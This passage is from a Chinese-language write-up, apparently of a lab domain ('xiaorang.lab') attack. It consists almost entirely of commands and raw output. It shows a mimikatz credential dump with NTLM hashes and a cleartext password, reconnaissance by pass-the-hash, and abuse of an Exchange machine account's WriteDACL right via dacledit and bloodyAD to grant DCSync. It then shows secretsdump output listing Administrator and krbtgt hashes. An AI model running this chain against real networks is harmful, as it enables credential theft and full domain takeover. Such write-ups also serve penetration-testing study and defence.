f2 1a 8d 9d 0c 85 7c 85 80 7e e3 0e 68 4c cc 8a f4 0e 93 af 23 26 4a 26 03 b3 2c 88 18 98 da db 21 93 40 d8 78 05 ec 4d 4e 2d d4 55 fe c6 2b 31 d6 11 fe dc 51 5c 00 c1 eb 67 a1 15 d0 56 c7 31 dd da dd f8 42 19 e0 9a 6f 89 76 bf 17 de be 6e cf a4 1f 09 8d 12 b2 83 69 83 e1 e9 32 56 ee 43 47 19 35 66 f5 e9 44 ee 5d 90 e1 60 01 bd 46 12 e7 54 1c 84 14 58 4a a4 00 18 ce 93 6d 9c b5 0a 3d 6d d9 db 02 86 44 1e 1b fc 62 73 b0 51 8a 09 44 50 dc 14 b1 38 d2 1d cd 71 d3 ed e5 c6 a2 1d 07 17 bd 2f 9b 58 79 91 d6 ed 73 76 a9 a8 47 fe 28 eb 99 f0 c0 52 72 8b 29 3d ea e1 41 79 e7 59 39 22 b0 0b 66 f9 ea c1 70 02 59 9e df a2 1d b8 96 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 10614933 (00000000:00a1f895)</span><br><span class="line">Session           : NetworkCleartext from 0</span><br><span class="line">User Name         : HealthMailbox0d5918e</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2025/3/11 15:27:00</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1136</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : d8ab6a5ecc31f0ee092162f6b4cbbb42</span><br><span class="line"> * SHA1     : ba8a181c30dd83e3cb8c8d62315ae23163340479</span><br><span class="line"> * DPAPI    : 608ba79cc390d4c930b34bb0e2fd9c35</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 10000729 (00000000:00989959)</span><br><span class="line">Session           : RemoteInteractive from 3</span><br><span class="line">User Name         : calm</span><br><span class="line">Domain            : XIAORANG-EXC01</span><br><span class="line">Logon Server      : XIAORANG-EXC01</span><br><span class="line">Logon Time        : 2025/3/11 15:25:44</span><br><span class="line">SID               : S-1-5-21-804691931-3750513266-524628342-1000</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : calm</span><br><span class="line"> * Domain   : XIAORANG-EXC01</span><br><span class="line"> * NTLM     : 6912928308e3cda903e6d75bd6091a20</span><br><span class="line"> * SHA1     : 4687d6f9b23b55f21825bc5157fe2cbe707c07de</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : calm</span><br><span class="line"> * Domain   : XIAORANG-EXC01</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : calm</span><br><span class="line"> * Domain   : XIAORANG-EXC01</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 995 (00000000:000003e3)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : IUSR</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 14:47:45</span><br><span class="line">SID               : S-1-5-17</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : XIAORANG-EXC01$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 14:47:27</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : xiaorang-exc01$</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 8772690 (00000000:0085dc52)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : DefaultAppPool</span><br><span class="line">Domain            : IIS APPPOOL</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 15:19:10</span><br><span class="line">SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 55c05b3a95ba11efa84aa33e20861e6f</span><br><span class="line"> * SHA1     : a551d481dcc12fcc09b5f27660b7b78d12b0523a</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 0f 3a 16 8a 52 bd 7d cc fe 2b 9c 57 8b f5 c7 7a c5 f0 a9 68 27 59 d1 8e a2 f1 ce af 48 b1 05 f2 1a 8d 9d 0c 85 7c 85 80 7e e3 0e 68 4c cc 8a f4 0e 93 af 23 26 4a 26 03 b3 2c 88 18 98 da db 21 93 40 d8 78 05 ec 4d 4e 2d d4 55 fe c6 2b 31 d6 11 fe dc 51 5c 00 c1 eb 67 a1 15 d0 56 c7 31 dd da dd f8 42 19 e0 9a 6f 89 76 bf 17 de be 6e cf a4 1f 09 8d 12 b2 83 69 83 e1 e9 32 56 ee 43 47 19 35 66 f5 e9 44 ee 5d 90 e1 60 01 bd 46 12 e7 54 1c 84 14 58 4a a4 00 18 ce 93 6d 9c b5 0a 3d 6d d9 db 02 86 44 1e 1b fc 62 73 b0 51 8a 09 44 50 dc 14 b1 38 d2 1d cd 71 d3 ed e5 c6 a2 1d 07 17 bd 2f 9b 58 79 91 d6 ed 73 76 a9 a8 47 fe 28 eb 99 f0 c0 52 72 8b 29 3d ea e1 41 79 e7 59 39 22 b0 0b 66 f9 ea c1 70 02 59 9e df a2 1d b8 96 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 1954603 (00000000:001dd32b)</span><br><span class="line">Session           : RemoteInteractive from 2</span><br><span class="line">User Name         : Zhangtong</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2025/3/11 14:49:11</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1147</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : Zhangtong</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4</span><br><span class="line"> * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e</span><br><span class="line"> * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : Zhangtong</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : Zhangtong</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 1880438 (00000000:001cb176)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 14:49:10</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 55c05b3a95ba11efa84aa33e20861e6f</span><br><span class="line"> * SHA1     : a551d481dcc12fcc09b5f27660b7b78d12b0523a</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 0f 3a 16 8a 52 bd 7d cc fe 2b 9c 57 8b f5 c7 7a c5 f0 a9 68 27 59 d1 8e a2 f1 ce af 48 b1 05 f2 1a 8d 9d 0c 85 7c 85 80 7e e3 0e 68 4c cc 8a f4 0e 93 af 23 26 4a 26 03 b3 2c 88 18 98 da db 21 93 40 d8 78 05 ec 4d 4e 2d d4 55 fe c6 2b 31 d6 11 fe dc 51 5c 00 c1 eb 67 a1 15 d0 56 c7 31 dd da dd f8 42 19 e0 9a 6f 89 76 bf 17 de be 6e cf a4 1f 09 8d 12 b2 83 69 83 e1 e9 32 56 ee 43 47 19 35 66 f5 e9 44 ee 5d 90 e1 60 01 bd 46 12 e7 54 1c 84 14 58 4a a4 00 18 ce 93 6d 9c b5 0a 3d 6d d9 db 02 86 44 1e 1b fc 62 73 b0 51 8a 09 44 50 dc 14 b1 38 d2 1d cd 71 d3 ed e5 c6 a2 1d 07 17 bd 2f 9b 58 79 91 d6 ed 73 76 a9 a8 47 fe 28 eb 99 f0 c0 52 72 8b 29 3d ea e1 41 79 e7 59 39 22 b0 0b 66 f9 ea c1 70 02 59 9e df a2 1d b8 96 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : XIAORANG-EXC01$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 14:47:42</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 55c05b3a95ba11efa84aa33e20861e6f</span><br><span class="line"> * SHA1     : a551d481dcc12fcc09b5f27660b7b78d12b0523a</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : xiaorang-exc01$</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 23747 (00000000:00005cc3)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 14:47:27</span><br><span class="line">SID               : </span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 55c05b3a95ba11efa84aa33e20861e6f</span><br><span class="line"> * SHA1     : a551d481dcc12fcc09b5f27660b7b78d12b0523a</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line">kerberos :</span><br><span class="line">ssp :</span><br><span class="line"> [00000000]</span><br><span class="line"> * Username : HealthMailbox0d5918ea7298475bbbb7e3602e1e289d@xiaorang.lab</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : Mh*vj]Z]Q02hqT+VLOB:_Se]zl@VS+v&gt;4Z^P+c=u;VQf+MiJD(?^=w#RmpxDeEI29QR&amp;e%^9nn3s*35h74jW5JeWV8^8fa#f9SIAv5)Dl5#hqaUZO2)m-)VT=huQe)[c</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 2399786 (00000000:00249e2a)</span><br><span class="line">Session           : NetworkCleartext from 0</span><br><span class="line">User Name         : HealthMailbox0d5918e</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2025/3/11 14:49:39</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1136</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 2dd2fea458c9690609313e7d7c1d1094</span><br><span class="line"> * SHA1     : 710b23fb4ffb87bf98b5821e0e7a9b622e0a3283</span><br><span class="line"> * DPAPI    : 4bb9f57b64b8fb82bcaabba12708f6bb</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 1880415 (00000000:001cb15f)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 14:49:10</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 55c05b3a95ba11efa84aa33e20861e6f</span><br><span class="line"> * SHA1     : a551d481dcc12fcc09b5f27660b7b78d12b0523a</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 0f 3a 16 8a 52 bd 7d cc fe 2b 9c 57 8b f5 c7 7a c5 f0 a9 68 27 59 d1 8e a2 f1 ce af 48 b1 05 f2 1a 8d 9d 0c 85 7c 85 80 7e e3 0e 68 4c cc 8a f4 0e 93 af 23 26 4a 26 03 b3 2c 88 18 98 da db 21 93 40 d8 78 05 ec 4d 4e 2d d4 55 fe c6 2b 31 d6 11 fe dc 51 5c 00 c1 eb 67 a1 15 d0 56 c7 31 dd da dd f8 42 19 e0 9a 6f 89 76 bf 17 de be 6e cf a4 1f 09 8d 12 b2 83 69 83 e1 e9 32 56 ee 43 47 19 35 66 f5 e9 44 ee 5d 90 e1 60 01 bd 46 12 e7 54 1c 84 14 58 4a a4 00 18 ce 93 6d 9c b5 0a 3d 6d d9 db 02 86 44 1e 1b fc 62 73 b0 51 8a 09 44 50 dc 14 b1 38 d2 1d cd 71 d3 ed e5 c6 a2 1d 07 17 bd 2f 9b 58 79 91 d6 ed 73 76 a9 a8 47 fe 28 eb 99 f0 c0 52 72 8b 29 3d ea e1 41 79 e7 59 39 22 b0 0b 66 f9 ea c1 70 02 59 9e df a2 1d b8 96 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 105109 (00000000:00019a95)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : Zhangtong</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2025/3/11 14:47:44</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1147</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : Zhangtong</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4</span><br><span class="line"> * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e</span><br><span class="line"> * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : Zhangtong</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : Zhangtong</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 14:47:43</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # exit</span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure><p>这两个比较有用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Zhangtong</span><br><span class="line">22c7f81993e96ac83ac2f3f1903de8b4</span><br><span class="line"> </span><br><span class="line">XIAORANG-EXC01$</span><br><span class="line">55c05b3a95ba11efa84aa33e20861e6f</span><br></pre></td></tr></table></figure><p>传个Adinfo收集信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Adinfo_win.exe -d xiaorang.lab --dc 172.22.3.2 -u XIAORANG-EXC01$ -H 55c05b3a95ba11efa84aa33e20861e6f</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">           _____  _        __</span><br><span class="line">     /\   |  __ \(_)      / _|</span><br><span class="line">    /  \  | |  | |_ _ __ | |_ ___</span><br><span class="line">   / /\ \ | |  | | | &#x27;_ \|  _/ _ \     Tools that collect information from domain</span><br><span class="line">  / ____ \| |__| | | | | | || (_) |</span><br><span class="line"> /_/    \_\_____/|_|_| |_|_| \___/     v1.5 by lzz</span><br><span class="line"></span><br><span class="line">[i] Try to connect &#x27;172.22.3.2&#x27;</span><br><span class="line">[c] Auth Domain: xiaorang.lab</span><br><span class="line">[c] Auth user: XIAORANG-EXC01$</span><br><span class="line">[c] Auth hash: 55c05b3a95ba11efa84aa33e20861e6f</span><br><span class="line">[c] connected successfully,try to dump domain info</span><br><span class="line">[i] DomainVersion found!</span><br><span class="line">                    [+] Windows 2016 Server operating system</span><br><span class="line">[i] Domain SID:</span><br><span class="line">                    [+] S-1-5-21-533686307-2117412543-4200729784</span><br><span class="line">[i] Domain MAQ found</span><br><span class="line">                    [+] 10</span><br><span class="line">[i] Domain Account Policy found</span><br><span class="line">                    [+] pwdHistory: 24</span><br><span class="line">                    [+] minPwdLength: 7</span><br><span class="line">                    [+] minPwdAge: 1(day)</span><br><span class="line">                    [+] maxPwdAge: 10675199(day)</span><br><span class="line">                    [+] lockoutThreshold: 0</span><br><span class="line">                    [+] lockoutDuration: 30(min)</span><br><span class="line">[i] Domain Controllers: 1 found</span><br><span class="line">                    [+] XIAORANG-WIN16$  ==&gt;&gt;&gt;   Windows Server 2016 Datacenter  [10.0 (14393)]  ==&gt;&gt;&gt;  172.22.3.2</span><br><span class="line">[i] ADCS has not found!</span><br><span class="line">[i] Domain Exchange Server: 1 found</span><br><span class="line">                    [+] XIAORANG-EXC01$  ==&gt;&gt;&gt;  Exchange Server 2016  ==&gt;&gt;&gt;  172.22.3.9</span><br><span class="line">[i] Domain All DNS:</span><br><span class="line">                    [+] Domain Dns 3 found,Saved in All_DNS.csv</span><br><span class="line">[i] Domain Trusts: 0 found</span><br><span class="line">[i] SPN: 59 found</span><br><span class="line">[i] Domain GPOs: 2 found</span><br><span class="line">[i] Domain Admins: 1 users found</span><br><span class="line">                    [+]Administrator</span><br><span class="line">[i] Enterprise Admins: 1 users found</span><br><span class="line">                    [+]Administrator</span><br><span class="line">[i] administrators: 1 users found</span><br><span class="line">                    [+]Administrator</span><br><span class="line">[i] Backup Operators: 0 users found</span><br><span class="line">[i] Users: 27 found</span><br><span class="line">[i] User with Mail: 23 found</span><br><span class="line">[i] Only_name_and_Useful_Users: 14 found</span><br><span class="line">[i] Only_admincount=1_andUseful_Users: 1 found</span><br><span class="line">[i] Locked Users: 0 found</span><br><span class="line">[i] Disabled Users: 13 found</span><br><span class="line">[i] Users with passwords not set to expire: 13 found</span><br><span class="line">[i] Domain Computers: 3 found</span><br><span class="line">[i] Only_name_and_Useful_computers: 3 found</span><br><span class="line">[i] Groups: 69 found</span><br><span class="line">[i] Domain OUs: 2 found</span><br><span class="line">[i] LAPS Not found</span><br><span class="line">[i] LAPS passwords: 0 found</span><br><span class="line">[i] SensitiveDelegate Users: 0 found</span><br><span class="line">[i] AsReproast Users: 0 found</span><br><span class="line">[i] Kerberoast Users: 1 found</span><br><span class="line">                    [+] CN=krbtgt,CN=Users,DC=xiaorang,DC=lab  ==&gt;&gt;&gt;  kadmin/changepw</span><br><span class="line">[i] SIDHistory Users: 0 found</span><br><span class="line">[i] CreatorSID Users: 0 found</span><br><span class="line">[i] RBCD Users: 0 found</span><br><span class="line">[i] Unconstrained Deligation Users: 0 found</span><br><span class="line">[i] Constrained Deligation Users: 0 found</span><br><span class="line">[i] Krbtgt password last set time: 2022-10-23 14:40:45 +0800 CST</span><br><span class="line">[i] CSVs written to &#x27;csv&#x27; directory in C:\Users\calm\Desktop</span><br><span class="line">[i] Execution took 2.1943333s</span><br></pre></td></tr></table></figure><h2 id="WriteDACL"><a href="#WriteDACL" class="headerlink" title="WriteDACL"></a>WriteDACL</h2><p>Exchange机器账户默认对域内成员具有 WriteDACL 权限, 因此可以写 DCSync<br>exchange机器账户隶属于Exchange Windows Permissions这个组中，而这个组具有write 域内acl权限，所以可以设置刚刚通过mimikatz拿到的域内用户Zhangtong的dcsync属性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 dacledit.py xiaorang.lab/XIAORANG-EXC01\$ -hashes :55c05b3a95ba11efa84aa33e20861e6f -action write -rights DCSync -principal Zhangtong -target-dn &quot;DC=xiaorang,DC=lab&quot; -dc-ip 172.22.3.2</span><br></pre></td></tr></table></figure><p>这边报错换个工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 bloodyAD.py -d xiaorang.lab -u &#x27;XIAORANG-EXC01$&#x27; -p :55c05b3a95ba11efa84aa33e20861e6f --host 172.22.3.2 add dcsync Zhangtong</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741679539260-24fedf10-9edb-40f8-8b21-c0b8fd251240.png"></p><p>打DSCync获取域控hash再打pth</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-secretsdump xiaorang.lab/XIAORANG-EXC01\$@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7acbc09a6c0efd81bfa7d5a1d4238beb:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b8fa79a52e918cb0cbcd1c0ede492647:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\$431000-7AGO1IPPEUGJ:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_46bc0bcd781047eba:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_2554056e362e45ba9:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_ae8e35b0ca3e41718:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_341e33a8ba4d46c19:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_3d52038e2394452f8:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_2ddd7a0d26c84e7cb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_015b052ab8324b3fa:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_9bd6f16aa25343e68:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_68af2c4169b54d459:1133:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span 